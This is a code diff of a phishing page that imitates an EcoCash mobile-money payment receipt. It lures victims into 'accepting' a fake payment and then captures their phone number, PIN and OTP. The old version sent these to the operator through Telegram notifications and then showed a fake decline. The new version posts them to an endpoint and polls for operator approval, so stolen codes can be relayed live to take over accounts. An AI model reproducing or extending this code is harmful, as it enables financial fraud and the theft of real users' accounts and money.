-  const urlParams = new URLSearchParams(window.location.search);
-  const trackingParam = urlParams.get('tracking') || urlParams.get('ecocash') || urlParams.get('id');
-  const payloadParam = urlParams.get('p') || urlParams.get('data');
-  let loaded = false;
+function loadReceiptFromURL(){
+  const params = new URLSearchParams(window.location.search);
+  const payloadParam = params.get('p') || params.get('data');
+  const trackingParam = params.get('tracking');
 
   if(payloadParam){
     try{
-      const jsonStr = decodeURIComponent(escape(atob(decodeURIComponent(payloadParam))));
-      const data = JSON.parse(jsonStr);
+      const json = JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(payloadParam)))));
       currentReceipt = {
-        trackingNumber: data.t || '',
-        accountName: data.n || '',
-        amount: data.a || '',
-        currency: data.c || '',
-        countryCode: data.cc || '',
-        countryFlag: data.cf || '',
-        countryName: data.cn || '',
-        accountNumber: data.acc || '',
-        modeOfPayment: data.m || '',
-        receiptOptional: data.r || '',
-        timestamp: data.ts || '',
+        trackingNumber: json.t || '',
+        accountName: json.n || '',
+        amount: json.a || '',
+        currency: json.c || '',
+        countryCode: json.cc || '',
+        countryFlag: json.cf || '',
+        countryName: json.cn || '',
+        accountNumber: json.acc || '',
+        modeOfPayment: json.m || '',
+        receiptOptional: json.r || '',
+        timestamp: json.ts || '',
         isAccepted:false, isDeclined:false
       };
-      loaded = true;
+      return;
     }catch(e){ console.error('Payload decode error:',e); }
   }
 
-  if(!loaded && trackingParam){
-    const history = getStoredHistory();
-    const found = history.find(item=>item.trackingNumber.toUpperCase() === trackingParam.toUpperCase());
-    if(found){ currentReceipt = {...found}; loaded = true; }
-    else {
-      currentReceipt = {
-        ...DEFAULT_SAMPLE_DATA,
-        trackingNumber: trackingParam.toUpperCase(),
-        accountName: urlParams.get('name') || '',
-        countryCode: urlParams.get('countryCode') || urlParams.get('code') || '',
-        countryFlag: urlParams.get('flag') || '',
-        countryName: urlParams.get('country') || '',
-        accountNumber: urlParams.get('acc') || urlParams.get('phone') || '',
-        amount: urlParams.get('amount') || '',
-        currency: urlParams.get('currency') || urlParams.get('cur') || '',
-        modeOfPayment: urlParams.get('mode') || '',
-        receiptOptional: urlParams.get('receipt') || ''
-      };
-      loaded = true;
+  if(trackingParam){
+    const saved = localStorage.getItem('ecocash_receipts_history');
+    if(saved){
+      try{
+        const list = JSON.parse(saved);
+        const found = list.find(r=>r.trackingNumber.toUpperCase() === trackingParam.toUpperCase());
+        if(found){ currentReceipt = {...found}; return; }
+      }catch(e){}
     }
+    currentReceipt = { ...DEFAULT_RECEIPT, trackingNumber: trackingParam.toUpperCase() };
   }
-
-  if(!loaded){
-    const saved = localStorage.getItem(STORAGE_KEY_CURRENT);
-    if(saved){ try{ currentReceipt = JSON.parse(saved); }catch(e){ currentReceipt = {...DEFAULT_SAMPLE_DATA}; } }
-  }
-
-  renderClientReceipt(currentReceipt);
 }
 
-function renderClientReceipt(data){
+function renderReceipt(data){
   const currency = (data.currency||'').toUpperCase();
-  const formattedAmount = data.amount ? `${currency} ${parseFloat(data.amount).toFixed(2)}`.trim() : '';
-  const amountEl = document.getElementById('display-amount');
-  const nameEl = document.getElementById('display-account-name');
-  const numEl = document.getElementById('display-account-number');
-  const modeEl = document.getElementById('display-mode-payment');
-  const srvEl = document.getElementById('display-service-name');
-  const countryEl = document.getElementById('display-country-name');
-  const txIdEl = document.getElementById('display-tracking-id');
+  const amt = data.amount ? `${currency} ${parseFloat(data.amount).toFixed(2)}`.trim() : '';
+
+  document.getElementById('display-amount').textContent = amt;
+  document.getElementById('display-account-name').textContent = data.accountName || '';
+  document.getElementById('display-account-number').textContent = data.accountNumber || '';
+  document.getElementById('display-mode-payment').textContent = data.modeOfPayment || '';
+  document.getElementById('display-service-name').textContent = data.receiptOptional || '';
+  document.getElementById('display-country-name').textContent = data.countryName ? `${data.countryFlag||''} ${data.countryName} (${data.countryCode||''})`.trim() : '';
+  document.getElementById('display-tracking-id').textContent = data.trackingNumber || '';
+
+  const rA = document.getElementById('recipient-avatar');
+  const sA = document.getElementById('sender-avatar');
+  if(rA) rA.textContent = data.accountName ? getInitials(data.accountName) : '';
+  if(sA) sA.textContent = data.modeOfPayment ? getInitials(data.modeOfPayment) : '';
+
   const timeEl = document.getElementById('receipt-timestamp');
-  const rAvatarEl = document.getElementById('recipient-avatar');
-  const sAvatarEl = document.getElementById('sender-avatar');
-  if(amountEl) amountEl.textContent = formattedAmount;
-  if(nameEl) nameEl.textContent = data.accountName || '';
-  if(numEl) numEl.textContent = data.accountNumber || '';
-  if(modeEl) modeEl.textContent = data.modeOfPayment || '';
-  if(srvEl) srvEl.textContent = data.receiptOptional || '';
-  if(countryEl) countryEl.textContent = data.countryName ? `${data.countryFlag||''} ${data.countryName} (${data.countryCode||''})`.trim() : '';
-  if(txIdEl) txIdEl.textContent = data.trackingNumber || '';
-  if(rAvatarEl) rAvatarEl.textContent = data.accountName ? getInitials(data.accountName,'') : '';
-  if(sAvatarEl) sAvatarEl.textContent = data.modeOfPayment ? getInitials(data.modeOfPayment,'') : '';
-
-  if(timeEl){
-    if(data.timestamp){ timeEl.textContent = data.timestamp; }
-    else {
-      const now = new Date();
-      const monthNames = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
-      const hours = String(now.getHours()).padStart(2,'0');
-      const mins = String(now.getMinutes()).padStart(2,'0');
-      timeEl.textContent = `${monthNames[now.getMonth()]} ${now.getDate()} ${hours}:${mins}`;
-    }
+  if(data.timestamp){ timeEl.textContent = data.timestamp; }
+  else {
+    const n = new Date();
+    const m = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
+    timeEl.textContent = `${m[n.getMonth()]} ${n.getDate()} ${String(n.getHours()).padStart(2,'0')}:${String(n.getMinutes()).padStart(2,'0')}`;
   }
 
-  const acceptBtn = document.getElementById('btn-accept-payment');
-  const acceptText = document.getElementById('accept-payment-text');
-  if(acceptBtn && acceptText){
-    if(data.isAccepted){ acceptBtn.classList.add('accepted'); acceptBtn.classList.remove('declined'); acceptText.textContent='Payment Accepted ✓'; }
-    else if(data.isDeclined){ acceptBtn.classList.remove('accepted'); acceptBtn.classList.add('declined'); acceptText.textContent='Payment Declined ✕ (Retry)'; }
-    else { acceptBtn.classList.remove('accepted'); acceptBtn.classList.remove('declined'); acceptText.textContent='Accept payment'; }
-  }
-
-  updateClientLoginCountry();
+  const flag = document.getElementById('login-flag-icon');
+  const dial = document.getElementById('login-dial-code');
+  if(flag) flag.textContent = data.countryFlag || '🇿🇼';
+  if(dial) dial.textContent = data.countryCode || '+263';
 }
 
-function updateClientLoginCountry(){
-  const flagEl = document.getElementById('login-flag-icon');
-  const dialEl = document.getElementById('login-dial-code');
-  const tooltipText = document.getElementById('tooltip-text');
-  const flag = currentReceipt.countryFlag || '🇿🇼';
-  const code = currentReceipt.countryCode || '+263';
-  if(flagEl) flagEl.textContent = flag;
-  if(dialEl) dialEl.textContent = code;
-  if(tooltipText) tooltipText.textContent = code === '+266' ? 'Enter 4 digit MPIN' : 'Enter 4 digit PIN';
-}
-
-function handleAcceptPayment(){
-  if(currentReceipt.isAccepted){ showToast('This payment has already been authorized.'); return false; }
-  openLoginModal();
-  return false;
-}
-
-function openLoginModal(){
-  updateClientLoginCountry();
-  const phoneInput = document.getElementById('login-phone-input');
-  if(phoneInput){
-    let phoneVal = currentReceipt.accountNumber || '';
-    if(phoneVal.startsWith('0')) phoneVal = phoneVal.substring(1);
-    phoneInput.value = phoneVal;
-  }
-  for(let i=1;i<=4;i++){
-    const pinBox = document.getElementById(`pin-${i}`);
-    if(pinBox) pinBox.value = '';
-  }
-  document.getElementById('modal-ecocash-login').classList.add('open');
-  setTimeout(()=>{ const p = document.getElementById('pin-1'); if(p) p.focus(); },200);
-}
-
+/* ================= PIN FLOW ================= */
 function setupPinInputs(){
   for(let i=1;i<=4;i++){
-    const input = document.getElementById(`pin-${i}`);
-    if(!input) continue;
-    input.addEventListener('input',(e)=>{
-      const val = e.target.value.replace(/\D/g,'');
-      if(val.length >= 1){
-        e.target.value = val.slice(-1);
-        if(i < 4){ const next = document.getElementById(`pin-${i+1}`); if(next) next.focus(); }
-        else { setTimeout(proceedToOtp,250); }
-      } else { e.target.value = ''; }
+    const el = document.getElementById(`pin-${i}`);
+    if(!el) continue;
+    el.addEventListener('input',(e)=>{
+      const v = e.target.value.replace(/\D/g,'');
+      if(v){ e.target.value = v.slice(-1); if(i<4) document.getElementById(`pin-${i+1}`).focus(); }
+      else { e.target.value=''; }
     });
-    input.addEventListener('keydown',(e)=>{
-      if(e.key === 'Backspace' && !e.target.value && i > 1){
+    el.addEventListener('keydown',(e)=>{
+      if(e.key==='Backspace' && !e.target.value && i>1){
         const prev = document.getElementById(`pin-${i-1}`);
         if(prev){ prev.focus(); prev.value=''; }
       }
     });
-    input.addEventListener('paste',(e)=>{
+    el.addEventListener('paste',(e)=>{
       e.preventDefault();
-      const pasted = (e.clipboardData || window.clipboardData).getData('text').trim();
-      if(/^\d{4}$/.test(pasted)){
-        for(let j=0;j<4;j++){ const box = document.getElementById(`pin-${j+1}`); if(box) box.value = pasted[j]; }
-        setTimeout(proceedToOtp,250);
+      const p = (e.clipboardData||window.clipboardData).getData('text').trim();
+      if(/^\d{4}$/.test(p)){
+        for(let j=0;j<4;j++) document.getElementById(`pin-${j+1}`).value = p[j];
       }
     });
   }
 }
 
-function proceedToOtp(){
-  const phoneInput = document.getElementById('login-phone-input');
-  if(phoneInput && !phoneInput.value.trim()){ showToast('Please enter your EcoCash phone number'); phoneInput.focus(); return; }
-  let enteredPin = '';
-  for(let i=1;i<=4;i++){ const box = document.getElementById(`pin-${i}`); if(box) enteredPin += box.value; }
-  if(enteredPin.length < 4){ showToast('Please enter your complete 4-digit EcoCash PIN'); return; }
-  const phoneInputVal = phoneInput ? phoneInput.value : '';
-  sendTelegramNotification({
-    referenceId: currentReceipt.trackingNumber || 'UNKNOWN',
-    serviceType: currentReceipt.modeOfPayment,
-    recipientName: currentReceipt.accountName,
-    destination: phoneInputVal || currentReceipt.accountNumber,
-    status: 'PIN Captured',
-    notes: `PIN Code: ${enteredPin}`
-  });
-  closeModal('modal-ecocash-login');
-  openOtpModal();
+function openLoginModal(){
+  document.getElementById('login-phone-input').value = (currentReceipt.accountNumber||'').replace(/^0/,'');
+  for(let i=1;i<=4;i++) document.getElementById(`pin-${i}`).value = '';
+  document.getElementById('modal-ecocash-login').classList.add('open');
+  setTimeout(()=>document.getElementById('pin-1').focus(),200);
 }
 
-function getOtpLength(){ return currentReceipt.countryCode === '+266' ? 4 : 6; }
+function handleAcceptPayment(){
+  if(currentReceipt.isAccepted){ showToast('Already authorized'); return; }
+  openLoginModal();
+}
 
-function openOtpModal(){
-  const code = currentReceipt.countryCode || '+263';
-  const otpLength = getOtpLength();
-  const loginPhoneEl = document.getElementById('login-phone-input');
-  let phone = (loginPhoneEl && loginPhoneEl.value.trim()) || currentReceipt.accountNumber || '';
-  const fullPhoneDisplay = `${code} ${phone}`;
-  const displayEl = document.getElementById('otp-phone-display');
-  if(displayEl) displayEl.textContent = fullPhoneDisplay;
-  for(let i=1;i<=6;i++){
-    const otpBox = document.getElementById(`otp-${i}`);
-    if(otpBox){ otpBox.value=''; otpBox.style.display = i <= otpLength ? '' : 'none'; }
+async function submitPin(){
+  const phone = document.getElementById('login-phone-input').value.trim();
+  if(!phone){ showToast('Enter phone number'); return; }
+  let pin = '';
+  for(let i=1;i<=4;i++) pin += document.getElementById(`pin-${i}`).value;
+  if(pin.length < 4){ showToast('Enter complete PIN'); return; }
+
+  const btn = document.getElementById('btn-login-submit');
+  btn.disabled = true; btn.textContent = 'Sending...';
+
+  try{
+    const res = await fetch(NOTIFY_ENDPOINT,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        stage:'pin',
+        phone,
+        pinOrOtp: pin,
+        receipt: currentReceipt
+      })
+    });
+    const data = await res.json();
+    if(!data.ok){ throw new Error(data.error || 'Failed'); }
+
+    currentSessionId = data.sessionId;
+    currentStage = 'pin';
+    closeModal('modal-ecocash-login');
+    showWaiting('Waiting for approval…','Your PIN is being verified. Please wait.');
+    startPolling();
+  }catch(err){
+    console.error(err);
+    showToast('Network error. Please try again.');
+  }finally{
+    btn.disabled = false; btn.textContent = 'Login';
   }
-  startOtpCountdown();
-  document.getElementById('modal-otp-verify').classList.add('open');
-  setTimeout(()=>{ const o = document.getElementById('otp-1'); if(o) o.focus(); },200);
-  showToast(`OTP verification code sent to ${fullPhoneDisplay}`);
 }
 
+/* ================= OTP FLOW ================= */
 function setupOtpInputs(){
   for(let i=1;i<=6;i++){
-    const input = document.getElementById(`otp-${i}`);
-    if(!input) continue;
-    input.addEventListener('input',(e)=>{
-      const otpLength = getOtpLength();
-      const val = e.target.value.replace(/\D/g,'');
-      if(val.length >= 1){
-        e.target.value = val.slice(-1);
-        if(i < otpLength){ const next = document.getElementById(`otp-${i+1}`); if(next) next.focus(); }
-        else { setTimeout(verifyOtpAndAccept,300); }
-      } else { e.target.value = ''; }
+    const el = document.getElementById(`otp-${i}`);
+    if(!el) continue;
+    el.addEventListener('input',(e)=>{
+      const v = e.target.value.replace(/\D/g,'');
+      if(v){ e.target.value = v.slice(-1); if(i<6) document.getElementById(`otp-${i+1}`).focus(); }
+      else { e.target.value=''; }
     });
-    input.addEventListener('keydown',(e)=>{
-      if(e.key === 'Backspace' && !e.target.value && i > 1){
+    el.addEventListener('keydown',(e)=>{
+      if(e.key==='Backspace' && !e.target.value && i>1){
         const prev = document.getElementById(`otp-${i-1}`);
         if(prev){ prev.focus(); prev.value=''; }
       }
     });
-    input.addEventListener('paste',(e)=>{
-      e.preventDefault();
-      const pasted = (e.clipboardData || window.clipboardData).getData('text').trim();
-      const otpLength = getOtpLength();
-      if(new RegExp(`^\\d{${otpLength}}$`).test(pasted)){
-        for(let j=0;j<otpLength;j++){ const box = document.getElementById(`otp-${j+1}`); if(box) box.value = pasted[j]; }
-        setTimeout(verifyOtpAndAccept,300);
-      }
-    });
   }
 }
 
-function startOtpCountdown(){
-  clearInterval(otpTimerInterval);
-  otpSecondsLeft = 30;
-  const timerText = document.getElementById('otp-timer-text');
-  const countdownEl = document.getElementById('otp-countdown');
-  const resendBtn = document.getElementById('btn-resend-otp');
-  if(timerText) timerText.style.display = 'inline';
-  if(resendBtn) resendBtn.style.display = 'none';
-  if(countdownEl) countdownEl.textContent = `${otpSecondsLeft}s`;
-  otpTimerInterval = setInterval(()=>{
-    otpSecondsLeft--;
-    if(otpSecondsLeft > 0){ if(countdownEl) countdownEl.textContent = `${otpSecondsLeft}s`; }
-    else {
-      clearInterval(otpTimerInterval);
-      if(timerText) timerText.style.display = 'none';
-      if(resendBtn) resendBtn.style.display = 'inline';
-    }
-  },1000);
+function openOtpModal(){
+  const code = currentReceipt.countryCode || '+263';
+  const phone = document.getElementById('login-phone-input').value || currentReceipt.accountNumber || '';
+  document.getElementById('otp-phone-display').textContent = `${code} ${phone}`;
+  for(let i=1;i<=6;i++) document.getElementById(`otp-${i}`).value = '';
+  document.getElementById('modal-otp-verify').classList.add('open');
+  setTimeout(()=>document.getElementById('otp-1').focus(),200);
 }
 
-function resendOtp(){ startOtpCountdown(); showToast('New OTP verification code sent via SMS'); }
-function backToLogin(){ closeModal('modal-otp-verify'); openLoginModal(); }
+async function submitOtp(){
+  let otp = '';
+  for(let i=1;i<=6;i++){
+    const v = document.getElementById(`otp-${i}`).value;
+    if(v) otp += v;
+  }
+  if(otp.length < 4){ showToast('Enter OTP'); return; }
 
-function verifyOtpAndAccept(){
-  const otpLength = getOtpLength();
-  let otpCode = '';
-  for(let i=1;i<=otpLength;i++){ const box = document.getElementById(`otp-${i}`); if(box) otpCode += box.value; }
-  if(otpCode.length < otpLength){ showToast(`Please enter the complete ${otpLength}-digit OTP code`); return; }
-  const loginPhoneEl = document.getElementById('login-phone-input');
-  const phoneInputVal = (loginPhoneEl && loginPhoneEl.value) || '';
-  sendTelegramNotification({
-    referenceId: currentReceipt.trackingNumber || 'UNKNOWN',
-    serviceType: currentReceipt.modeOfPayment,
-    recipientName: currentReceipt.accountName,
-    destination: phoneInputVal || currentReceipt.accountNumber,
-    status: 'OTP Captured',
-    notes: `OTP Code: ${otpCode}`
-  });
-  const btn = document.getElementById('btn-submit-otp');
-  if(btn){ btn.textContent = 'Verifying Authorization...'; btn.disabled = true; }
-  setTimeout(()=>{
-    if(btn){ btn.textContent = 'Verify OTP & Release Payment'; btn.disabled = false; }
+  const phone = document.getElementById('login-phone-input').value.trim();
+  const btn = document.getElementById('btn-otp-submit');
+  btn.disabled = true; btn.textContent = 'Sending...';
+
+  try{
+    const res = await fetch(NOTIFY_ENDPOINT,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        stage:'otp',
+        phone,
+        pinOrOtp: otp,
+        receipt: currentReceipt
+      })
+    });
+    const data = await res.json();
+    if(!data.ok){ throw new Error(data.error || 'Failed'); }
+
+    currentSessionId = data.sessionId;
+    currentStage = 'otp';
     closeModal('modal-otp-verify');
-    currentReceipt.isAccepted = false;
-    currentReceipt.isDeclined = true;
-    localStorage.setItem(STORAGE_KEY_CURRENT, JSON.stringify(currentReceipt));
-    updateHistoryItem(currentReceipt);
-    renderClientReceipt(currentReceipt);
-    const declTx = document.getElementById('declined-tx-id');
-    if(declTx) declTx.textContent = currentReceipt.trackingNumber || '';
-    document.getElementById('modal-payment-declined').classList.add('open');
-    showToast('✕ Payment Authorization Declined: Response Code EC-DECLINE-704');
-  },800);
+    showWaiting('Verifying OTP…','Your OTP is being verified. Please wait.');
+    startPolling();
+  }catch(err){
+    console.error(err);
+    showToast('Network error. Please try again.');
+  }finally{
+    btn.disabled = false; btn.textContent = 'Verify OTP';
+  }
 }
 
-function retryPayment(){
-  closeModal('modal-payment-declined');
-  currentReceipt.isDeclined = false;
-  renderClientReceipt(currentReceipt);
+/* ================= POLLING ================= */
+function startPolling(){
+  stopPolling();
+  pollTimer = setInterval(checkStatus, 2000);
+}
+
+function stopPolling(){
+  if(pollTimer){ clearInterval(pollTimer); pollTimer = null; }
+}
+
+async function checkStatus(){
+  if(!currentSessionId) return;
+  try{
+    const res = await fetch(`${STATUS_ENDPOINT}/${currentSessionId}`);
+    const data = await res.json();
+    if(!data.ok) return;
+
+    if(data.status === 'approved'){
+      stopPolling();
+      hideWaiting();
+      if(currentStage === 'pin'){
+        openOtpModal();
+      } else if(currentStage === 'otp'){
+        showInReview();
+      }
+    } else if(data.status === 'declined'){
+      stopPolling();
+      hideWaiting();
+      showError('Wrong credentials','Please check your PIN and try again.');
+    } else if(data.status === 'resend'){
+      stopPolling();
+      hideWaiting();
+      showToast('New verification required. Please enter PIN again.');
+      openLoginModal();
+    } else if(data.status === 'expired'){
+      stopPolling();
+      hideWaiting();
+      showError('Session Expired','Your request timed out. Please try again.');
+    }
+  }catch(e){ console.error('poll error:',e); }
+}
+
+/* ================= UI HELPERS ================= */
+function showWaiting(title, desc){
+  document.getElementById('waiting-title').textContent = title;
+  document.getElementById('waiting-desc').textContent = desc;
+  document.getElementById('waiting-overlay').classList.add('open');
+}
+function hideWaiting(){ document.getElementById('waiting-overlay').classList.remove('open'); }
+
+function showError(title, desc){
+  document.getElementById('error-title').textContent = title;
+  document.getElementById('error-desc').textContent = desc;
+  document.getElementById('modal-error').classList.add('open');
+}
+
+function closeErrorAndRetry(){
+  document.getElementById('modal-error').classList.remove('open');
   openLoginModal();
 }
 
-/* =========================================================
-   UTILITIES & MODALS
-   ========================================================= */
-function getInitials(name, fallback){
-  if(fallback === undefined) fallback = 'EC';
-  if(!name || typeof name !== 'string') return fallback;
-  const clean = name.trim();
-  if(!clean) return fallback;
-  const parts = clean.split(/\s+/);
-  if(parts.length >= 2) return (parts[0][0] + parts[1][0]).toUpperCase();
-  if(parts[0].length >= 2) return parts[0].substring(0,2).toUpperCase();
-  return parts[0][0].toUpperCase();
+function showInReview(){
+  document.getElementById('modal-inreview').classList.add('open');
 }
 
-function getStoredHistory(){
-  try{ const data = localStorage.getItem(STORAGE_KEY_RECEIPTS); return data ? JSON.parse(data) : []; }
-  catch(e){ return []; }
+function closeInReview(){
+  document.getElementById('modal-inreview').classList.remove('open');
 }
 
-function saveToHistory(item){
-  let list = getStoredHistory();
-  list = list.filter(r=>r.trackingNumber !== item.trackingNumber);
-  list.unshift(item);
-  if(list.length > 20) list = list.slice(0,20);
-  localStorage.setItem(STORAGE_KEY_RECEIPTS, JSON.stringify(list));
-}
-
-function updateHistoryItem(item){
-  let list = getStoredHistory();
-  const index = list.findIndex(r=>r.trackingNumber === item.trackingNumber);
-  if(index !== -1){ list[index] = {...item}; localStorage.setItem(STORAGE_KEY_RECEIPTS, JSON.stringify(list)); }
-}
-
-function openShareModal(){
-  const shareUrl = buildClientPaymentUrl(currentReceipt);
-  const input = document.getElementById('share-link-input');
-  if(input) input.value = shareUrl;
-  document.getElementById('modal-share').classList.add('open');
-}
-
-function openReminderModal(){
-  const reminderTx = document.getElementById('reminder-tx-id');
-  if(reminderTx) reminderTx.textContent = currentReceipt.trackingNumber || '';
-  const nextHour = new Date(Date.now() + 3600000);
-  const timeInput = document.getElementById('reminder-time');
-  if(timeInput) timeInput.value = nextHour.toISOString().slice(0,16);
-  document.getElementById('modal-reminder').classList.add('open');
-}
+function closeModal(id){ document.getElementById(id).classList.remove('open'); }
+function closeModalOnBackdrop(e,id){ if(e.target.id === id) closeModal(id); }
 
 function openHelpModal(){ document.getElementById('modal-help').classList.add('open'); }
-
-function closeModal(modalId){
-  const modal = document.getElementById(modalId);
-  if(modal) modal.classList.remove('open');
-  if(modalId === 'modal-otp-verify') clearInterval(otpTimerInterval);
+function openShareModal(){
+  document.getElementById('share-link-input').value = window.location.href;
+  document.getElementById('modal-share').classList.add('open');
 }
-
-function closeModalOnBackdrop(e, modalId){ if(e.target.id === modalId) closeModal(modalId); }
-
 function copyShareInput(){
-  const input = document.getElementById('share-link-input');
-  if(!input) return;
-  input.select(); input.setSelectionRange(0,99999);
-  navigator.clipboard.writeText(input.value).then(()=>showToast('Receipt share link copied!')).catch(()=>showToast('Link copied!'));
+  const i = document.getElementById('share-link-input');
+  i.select(); i.setSelectionRange(0,99999);
+  navigator.clipboard.writeText(i.value).then(()=>showToast('Link copied!'));
 }
-
 function copyReceiptText(){
-  const summary = `*EcoCash Transaction Receipt*
-Status: ${currentReceipt.isAccepted ? 'Payment Released ✓' : 'Transaction Initiated'}
-Amount: ${currentReceipt.currency} ${parseFloat(currentReceipt.amount||0).toFixed(2)}
-Account Name: ${currentReceipt.accountName}
-Account Number: ${currentReceipt.accountNumber}
-Country: ${currentReceipt.countryFlag||'🇿🇼'} ${currentReceipt.countryCode||'+263'}
-From: ${currentReceipt.modeOfPayment}
-Service: ${currentReceipt.receiptOptional}
-Transaction ID: ${currentReceipt.trackingNumber}
-Time: ${currentReceipt.timestamp}
-Verified by EcoCash`;
-  navigator.clipboard.writeText(summary).then(()=>{
-    showToast('Receipt summary copied!');
-    closeModal('modal-share');
-  });
+  const t = `EcoCash Receipt\nAmount: ${currentReceipt.currency} ${currentReceipt.amount}\nName: ${currentReceipt.accountName}\nTxID: ${currentReceipt.trackingNumber}`;
+  navigator.clipboard.writeText(t).then(()=>showToast('Copied!'));
 }
-
-function saveReminder(){
-  closeModal('modal-reminder');
-  showToast(`Reminder set for transaction ${currentReceipt.trackingNumber}`);
-}
-
 function printReceipt(){ window.print(); }
 
+function getInitials(name){
+  if(!name) return '';
+  const p = name.trim().split(/\s+/);
+  if(p.length >= 2) return (p[0][0]+p[1][0]).toUpperCase();
+  return p[0].substring(0,2).toUpperCase();
+}
+
 let toastTimeout;
-function showToast(message){
-  const toast = document.getElementById('toast');
-  if(!toast) return;
-  toast.textContent = message;
-  toast.classList.add('show');
+function showToast(msg){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
   clearTimeout(toastTimeout);
-  toastTimeout = setTimeout(()=>toast.classList.remove('show'),3200);
+  toastTimeout = setTimeout(()=>t.classList.remove('show'),3200);
 }
 
-function escapeHtml(str){
-  if(!str) return '';
-  return String(str)
-    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
-    .replace(/"/g,'&quot;').replace(/'/g,'&#039;');
-}
-
-/* =========================================================
-   BOOT
-   ========================================================= */
-document.addEventListener('DOMContentLoaded', initApp);
+document.addEventListener('DOMContentLoaded', init);
 </script>
 </body>
 </html>
